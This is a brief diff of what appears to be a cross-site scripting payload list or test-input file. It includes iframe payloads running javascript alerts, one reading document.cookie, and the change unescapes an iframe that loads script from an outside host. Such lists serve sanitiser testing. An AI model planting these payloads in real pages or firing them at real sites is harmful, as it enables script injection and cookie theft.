@@ -16,7 +16,7 @@ i
 
 "><h1><IFRAME SRC="javascript:alert('xss');"></IFRAME>">123</h1>
 <iframe src=javascript&colon;alert&lpar;document&period;cookie&rpar;>
-&lt;iframe src=http&colon;&sol;&sol;ha&period;ckers&period;org&sol;scriptlet&period;html&gt;
+<iframe src=http&colon;&sol;&sol;ha&period;ckers&period;org&sol;scriptlet&period;html>
 
 https://google.com/
 https://fb.com
